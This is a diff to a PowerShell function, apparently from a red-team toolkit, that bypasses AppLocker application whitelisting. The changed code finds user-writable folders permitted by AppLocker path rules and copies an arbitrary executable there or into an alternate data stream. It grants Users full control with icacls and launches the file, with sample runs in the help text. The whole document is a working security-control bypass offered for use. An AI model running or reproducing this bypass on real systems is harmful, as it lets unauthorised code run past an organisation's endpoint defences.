@@ -17,43 +17,90 @@ an allowed path and executes.
 
 .PARAMETER BinaryFile
 
-The binaryfile you want to execute. Needs to be full path: C:\folder\file.exe    
+The binaryfile you want to execute. Needs to be the full path: C:\folder\file.exe
+
+.PARAMETER Type
+This specifies the type of file you are trying to execute. This can either be Exe or Dll. 
+Dll is currently not added 100%.
+
+.PARAMETER Bruteforce
+
+When this switch is used the function will try all user writeable paths until it either 
+runs out of paths or it is able to execute the binary specified.   
+
+.PARAMETER ADS
+
+When this switch is used the function will place the binary inside an Alternate Data Stream on the user writeable folder.
 
 .EXAMPLE
 
-PS C:\> Invoke-PALBypassPwn -BinaryFile C:\folder\ba.exe
+PS C:\> Invoke-PALBypassPwn -BinaryFile C:\temp\ADExplorer.exe -Type Exe
 
 [*] Running Invoke-AppLockerBypassPwn
 
 [*] Trying to Pwn using modifiable paths that AppLocker allows
-[*] Getting modifiable paths allowed by AppLocker Path rules - Be patient!
-[+] Got the following EXE paths that is modifiable
+[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!
+[+] Got the following EXE paths that are modifiable
 
-Path
-----
-C:\Program Files (x86)\Dummy\Logs
-C:\Windows\Tasks
-C:\Windows\Temp
-C:\Windows\tracing
-C:\Windows\Registration\CRMLog
-C:\Windows\System32\FxsTmp
-C:\Windows\System32\Tasks
-C:\Windows\System32\com\dmp
-C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
-C:\Windows\System32\spool\PRINTERS
-C:\Windows\System32\spool\SERVERS
-C:\Windows\System32\spool\drivers\color
-C:\Windows\SysWOW64\FxsTmp
-C:\Windows\SysWOW64\Tasks
-C:\Windows\SysWOW64\com\dmp
+Name Path                                                
+---- ----                                                
+Exe  C:\Program Files (x86)\IBM\Client Access            
+Exe  C:\Windows\System32\spool\PRINTERS                  
+Exe  C:\Windows\System32\spool\SERVERS                   
+Exe  C:\Windows\System32\spool\drivers\color             
 
-[+] Copying binary file 7af064a7-f8cb-4486-8de8-de9aae9fffcb.exe to @{Path=C:\Program Files (x86)\Dummy\Logs}
 
-[+] Setting ACL using ICALCS giving Users full control of 7af064a7-f8cb-4486-8de8-de9aae9fffcb.exe
-[+] Trying to start binary file 7af064a7-f8cb-4486-8de8-de9aae9fffcb.exe
+[*] Picking random Path to try
+[+] C:\Windows\System32\spool\drivers\color was choosen
+
+[*] Picking random filename
+[+] b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe was choosen
+
+[+] Copying binary file b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe to C:\Windows\System32\spool\drivers\color
+
+[+] Checking ACL on C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
+[+] ACL's all good on C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
+[+] Trying to start binary file b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
 [+] Process launched - The world is ours!
-[+] Remember to delete - C:\Program Files (x86)\Dummy\Logs\7af064a7-f8cb-4486-8de8-de9aae9fffcb.exe
+[+] [Manual action needed] Remember to delete - C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
+[+] Command added to your clipboard
+Remove-item "C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe"
+
+.EXAMPLE
+
+PS C:\> Invoke-PALBypassPwn -BinaryFile C:\temp\ADExplorer.exe -Type Exe -bruteforce -ADS
+
+[*] Running Invoke-AppLockerBypassPwn
+
+[*] Trying to Pwn using modifiable paths that AppLocker allows
+[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!
+[+] Got the following EXE paths that are modifiable
+
+Name Path                                                
+---- ----                                                
+Exe  C:\Windows\Tasks                                    
+Exe  C:\Windows\tracing                                  
+Exe  C:\Windows\System32\FxsTmp                          
+Exe  C:\Windows\System32\Tasks                           
+
+[+] Copying binary file 409d49b5-774a-46ff-abcd-5c166a6a9f73.exe to ADS in C:\Windows\Tasks
+[+] Trying to start binary file C:\Windows\Tasks:409d49b5-774a-46ff-abcd-5c166a6a9f73.exe
+                                                         
+[-] Process failed to launched from C:\Windows\Tasks:409d49b5-774a-46ff-abcd-5c166a6a9f73.exe
+
+[+] Copying binary file 3a8a14d0-eda9-44f6-b7c6-1e97aff3c8cf.exe to ADS in C:\Windows\tracing
+[+] Trying to start binary file C:\Windows\tracing:3a8a14d0-eda9-44f6-b7c6-1e97aff3c8cf.exe
+                                                         
+[+] Process launched - The world is ours!
+[-] You need to manually remove the binaries added to the streams
+[+] List of commands
+Remove-item "C:\Windows\Tasks" -stream 409d49b5-774a-46ff-abcd-5c166a6a9f73.exe
+Remove-item "C:\Windows\tracing" -stream 3a8a14d0-eda9-44f6-b7c6-1e97aff3c8cf.exe
+
 #>
+
+# Function Version: 0.90
+
     [CmdletBinding()] Param (
         [parameter(Mandatory=$true)]
         [String]$BinaryFile,
@@ -73,142 +120,127 @@ C:\Windows\SysWOW64\com\dmp
             "`n[*] Running Invoke-AppLockerBypassPwn"
             
             "`n[*] Trying to Pwn using modifiable paths that AppLocker allows"
-            "[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!"
-            # Find paths allowed by rules, plant binary/dll and execute
-            $Paths = Get-PALWriteableAllowedPaths
-            $DllPaths = $Paths | where{$_.name -eq "Dll"} | Select-Object Path -Unique
-            $ExePaths = $Paths | where{$_.name -eq "Exe"} | Select-Object Path -Unique
-            $AppxPaths = $Paths | where{$_.name -eq "Appx"} | Select-Object Path -Unique
-            $ScriptPaths = $Paths | where{$_.name -eq "Script"} | Select-Object Path -Unique
-            $MSIPaths = $Paths | where{$_.name -eq "Msi"} | Select-Object Path -Unique
             
             if($Type -eq "Exe")
             {
-                if($ExePaths)
+                "[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!"
+                $AllowedPaths = Get-PALWriteableAllowedPaths -RuleSection Exe
+
+                if($AllowedPaths)
                 {
                     "[+] Got the following EXE paths that are modifiable"
-                    $ExePaths
-                    $RandomExePath = $ExePaths[(Get-Random -Minimum 0 -Maximum $ExePaths.Count)]
-                    "`n[*] Picking random Path to try"
-                    "[+] $($RandomExePath.path) was choosen"
-                    
+                    $AllowedPaths
+
                     if($BruteForce)
                     {
-                        Write-host "NOT IMPLEMENTED YET! Stopping!"
-                        break
-                        foreach($Ex in $ExePaths)
+                        $FilesLeftBehind = @()
+                        foreach($Path in $AllowedPaths)
                         {
                             $RandomFileName = [System.Guid]::NewGuid().ToString()+".exe"
                             if($ADS)
                             {
-                                "`n[+] Copying binary file $RandomFileName to ADS in $($Ex.path)"
-                                Get-Content $BinaryFile -Raw | set-content -path $ex.path -Stream $RandomFileName
-                                Write-Verbose "$ex.path\:$randomfilename"
-                                $CMDLine = "$($Ex.path):$RandomFileName"
+                                "`n[+] Copying binary file $RandomFileName to ADS in $($Path.path)"
+                                Get-Content $BinaryFile -Raw | set-content -path $Path.path -Stream $RandomFileName
+                                Write-Verbose "$Path.path\:$randomfilename"
+                                $CMDLine = "$($Path.path):$RandomFileName"
                                 "[+] Trying to start binary file $CMDLine"
                                 Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $CMDLine}
 
-                                sleep 3
+                                sleep 5
                                 $ProcessActive = get-process | where{$_.path -eq $CMDLine} -ErrorAction SilentlyContinue
                                 if($ProcessActive -eq $null)
                                 {
                                     "[-] Process failed to launched from $CMDLine"
-                                    "[-] You need to manually remove the binary: $CMDLine"
-                                    "Remove-item $($Ex.Path) -stream $RandomFileName"
+                                    $FilesLeftBehind += "Remove-item `"$($Path.Path)`" -stream $RandomFileName"
                                 }
                                 else
                                 {
                                     "[+] Process launched - The world is ours!"
-                                    "[-] You need to manually remove the binary: $CMDLine"
-                                    "Remove-item $($Ex.Path) -stream $RandomFileName"
+                                    "[-] You need to manually remove the binaries added to the streams"
+                                    "[+] List of commands"
+                                    $FilesLeftBehind += "Remove-item `"$($Path.Path)`" -stream $RandomFileName"
+                                    $FilesLeftBehind
                                     break
                                 }
                             }
                             else
                             {
-                                #Normal execution of file
-                                "`n[+] Copying binary file $RandomFileName to $($Ex.path)"
-                                copy-item -Path $BinaryFile -Destination (join-path $Ex.path $RandomFileName)
+                                # Bruteforce execution of file
+                                "`n[+] Copying binary file $RandomFileName to $($Path.path)"
+                                copy-item -Path $BinaryFile -Destination (join-path $($Path.Path) $RandomFileName)
                                 #####"`n[+] Setting ACL using ICALCS giving Users full control of $RandomFileName"
                                 #####icacls $pth"\"$tempname /grant "BUILTIN\Users:(F)" | Out-Null
                             
-                            
                                 "[+] Trying to start binary file $RandomFileName"
-                                & (join-path $Ex.Path $RandomFileName)
+                                Invoke-Expression "& '$(join-path $($Path.Path) $RandomFileName)'" -ErrorAction Stop
+                            
+                                #Check if process was launched
+                                Sleep 5
                                 
-                                sleep 3
-                                $ProcessActive = get-process | where{$_.path -eq $(join-path $Ex.Path $RandomFileName)} -ErrorAction SilentlyContinue
+                                $ProcessActive = get-process | where{$_.path -eq $(join-path $Path.Path $RandomFileName)} -ErrorAction SilentlyContinue
                                 if($ProcessActive -eq $null)
                                 {
-                                    "[-] Process failed to launched from (join-path $Ex.Path $RandomFileName)"
-                                    "[-] Remving copied binary: (join-path $Ex.Path $RandomFileName)"
-                                    remove-item (join-path $Ex.Path $RandomFileName)
+                                    "[-] Process failed to launched from (join-path $($Path.Path) $RandomFileName)"
+                                    "[-] Removing copied binary: (join-path $($Path.Path) $RandomFileName)"
+                                    remove-item (join-path $($Path.Path) $RandomFileName)
                                 }
                                 else
                                 {
                                     "[+] Process launched - The world is ours!"
-                                    "[+] Remember to delete - $(join-path $Ex.Path $RandomFileName)"
-                                    "Remove-item $(join-path $Ex.Path $RandomFileName)"
+                                    "[+] [Manual action needed] Remember to delete - $(join-path $($Path.Path) $RandomFileName)"
+                                    "Remove-item `"$(join-path $Path.Path $RandomFileName)`"" | clip
+                                    "[+] Command added to your clipboard"
+                                    "Remove-item `"$(join-path $($Path.Path) $RandomFileName)`""
                                     break
                                 }
                             }
                         }
                     }
-                    else #Only try one time and stop if failed
+                    else # Only try one time and stop if it fails
                     {
+                        $RandomPath = $AllowedPaths[(Get-Random -Minimum 0 -Maximum $AllowedPaths.Count)]
+                        "`n[*] Picking random Path to try"
+                        "[+] $($RandomPath.path) was choosen"
+                        
                         $RandomFileName = [System.Guid]::NewGuid().ToString()+".exe"
+                        "`n[*] Picking random filename"
+                        "[+] $($RandomFilename) was choosen"
                         if($ADS)
                         {
-                            #IF GET ACL FAILS - Its not worth it
-                            #$ACL = get-acl -Path $($RandomExePath.path)
-                            if($ACL)
+                            "`n[+] Copying binary file $RandomFileName to ADS in $($RandomPath.path)"
+                            Get-Content $BinaryFile -Raw | set-content -path $RandomPath.path -Stream $RandomFileName
+                            Write-Verbose "$RandomPath.path\:$randomfilename"
+                            $CMDLine = "$($RandomPath.path):$RandomFileName"
+                            "[+] Trying to start binary file $CMDLine"
+                            Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $CMDLine}
+
+                            sleep 5
+                            $ProcessActive = get-process | where{$_.path -eq $CMDLine} -ErrorAction SilentlyContinue
+                            if($ProcessActive -eq $null)
                             {
-                                #"[+] Copying binary file $RandomFileName to ADS in $($RandomExePath.path)"
-                                #Get-Content $BinaryFile -Raw | set-content -path $RandomExePath.path -Stream $RandomFileName -ErrorAction Stop
-                                #Write-Verbose "$RandomExePath.path\:$randomfilename"
-                                #$CMDLine = "$($RandomExePath.path):$RandomFileName"
-                                #"[+] Setting ACL using ICALCS giving Users full control on $CMDLine"
-                                #icacls $CMDLine /grant "BUILTIN\Users:(F)"                          
-                                #if($LASTEXITCODE -eq 0)
-                                #{
-                                #    "[+] Trying to start binary file $CMDLine"
-                                #    Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $CMDLine}
-                                #
-                                #    sleep 3
-                                #    $ProcessActive = get-process | where{$_.path -eq $CMDLine} -ErrorAction SilentlyContinue
-                                #    if($ProcessActive -eq $null)
-                                #    {
-                                #        "[-] Process failed to launched from $CMDLine"
-                                #        "[-] You need to manually remove the binary: $CMDLine"
-                                #        "Remove-item $($RandomExePath.Path) -stream $RandomFileName"
-                                #    }
-                                #    else
-                                #    {
-                                #        "[+] Process launched - The world is ours!"
-                                #        "[-] You need to manually remove the binary: $CMDLine"
-                                #        "Remove-item $($RandomExePath.Path) -stream $RandomFileName"
-                                #        break
-                                #    }
-                                #}
-                                #else
-                                #{
-                                #    "[-] Not able to change ACLs on file - Will stop execution and cleanup - Try again"
-                                #    ##remove-item (join-path $RandomExePath.Path $RandomFileName)
-                                #    break
-                                #}
+                                "[-] Process failed to launched from $CMDLine"
+                                "[-] You need to manually remove the binary: $CMDLine"
+                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName" | clip
+                                "[+] Command added to your clipboard"
+                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName"
+                                break
                             }
                             else
                             {
-                                #ACL not readable
-                                write-error "ACL not working"
+                                "[+] Process launched - The world is ours!"
+                                "[-] You need to manually remove the binary: $CMDLine"
+                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName" | clip
+                                "[+] Command added to your clipboard"
+                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName"
+                                break
                             }
                         }
                         else
                         {
                             #Normal execution of file
-                            "`n[+] Copying binary file $RandomFileName to $($RandomExePath.path)"
-                            copy-item -Path $BinaryFile -Destination (join-path $RandomExePath.path $RandomFileName)
-                            $JoinedPath = $($RandomExePath.Path+"\"+$RandomFileName)
+                            "`n[+] Copying binary file $RandomFileName to $($RandomPath.Path)"
+                            copy-item -Path $BinaryFile -Destination (join-path $($RandomPath.Path) $RandomFileName)
+                            $JoinedPath = $($RandomPath.Path+"\"+$RandomFileName)
                             
                             $user = $env:USERNAME
                             "`n[+] Checking ACL on $JoinedPath"
@@ -220,34 +252,35 @@ C:\Windows\SysWOW64\com\dmp
                             {
                                 "[+] Lackin correct ACL on $JoinedPath"
                                 "[+] Setting ACL using ICALCS giving Users full control on $JoinedPath"
+                                # Not possible to use Set-ACL in Constrained Language mode...Have to depend on ICACLS..that sux..
                                 icacls $JoinedPath /grant "BUILTIN\Users:(F)" 
                                 if($LASTEXITCODE -ne 0)
                                 {
-                                    "[-] Not able to change ACLs on file - Will stop execution and cleanup - Rerun function"
+                                    "[-] Not able to change ACLs on file - Will stop execution and cleanup - Re-run function to give it another try or use the bruteforce to try until you are successfull"
                                     remove-item (join-path $RandomExePath.Path $RandomFileName)
                                     break
                                 }
                             }
 
                             "[+] Trying to start binary file $RandomFileName"
-                            Invoke-Expression $(join-path $RandomExePath.Path $RandomFileName) -ErrorAction Stop
+                            invoke-expression "& '$(join-path $($RandomPath.Path) $RandomFileName)'" -ErrorAction Stop
                             
                             #Check if process was launched
                             Sleep 5
-                            $ProcessActive = get-process | where{$_.path -eq $(join-path $RandomExePath.Path $RandomFileName)} -ErrorAction SilentlyContinue
+                            $ProcessActive = get-process | where{$_.path -eq $(join-path $($RandomPath.Path) $RandomFileName)} -ErrorAction SilentlyContinue
                             if($ProcessActive -eq $null)
                             {
-                                "[-] Process failed to launched from $(join-path $RandomExePath.Path $RandomFileName)"
-                                "[-] Remving copied binary: $(join-path $RandomExePath.Path $RandomFileName)"
-                                remove-item $(join-path $RandomExePath.Path $RandomFileName)
+                                "[-] Process failed to launched from $(join-path $($RandomPath.Path) $RandomFileName)"
+                                "[-] Remving copied binary: $(join-path $($RandomPath.Path) $RandomFileName)"
+                                remove-item $(join-path $($RandomPath.Path) $RandomFileName)
                             }
                             else
                             {
                                 "[+] Process launched - The world is ours!"
-                                "[+] [Manual action needed] Remember to delete - $(join-path $RandomExePath.Path $RandomFileName)"
-                                "Remove-item $(join-path $RandomExePath.Path $RandomFileName)" | clip
-                                "[+] Command added to clipboard"
-                                "Remove-item $(join-path $RandomExePath.Path $RandomFileName)"
+                                "[+] [Manual action needed] Remember to delete - $(join-path $($RandomPath.Path) $RandomFileName)"
+                                "Remove-item `"$(join-path $($RandomPath.Path) $RandomFileName)`"" | clip
+                                "[+] Command added to your clipboard"
+                                "Remove-item `"$(join-path $($RandomPath.Path) $RandomFileName)`""
                                 break
                             }
                         }
@@ -262,6 +295,7 @@ C:\Windows\SysWOW64\com\dmp
             if($Type -eq "Dll")
             {
                 Write-error "Not implemented yet"
+                break
             }
         }
         Catch
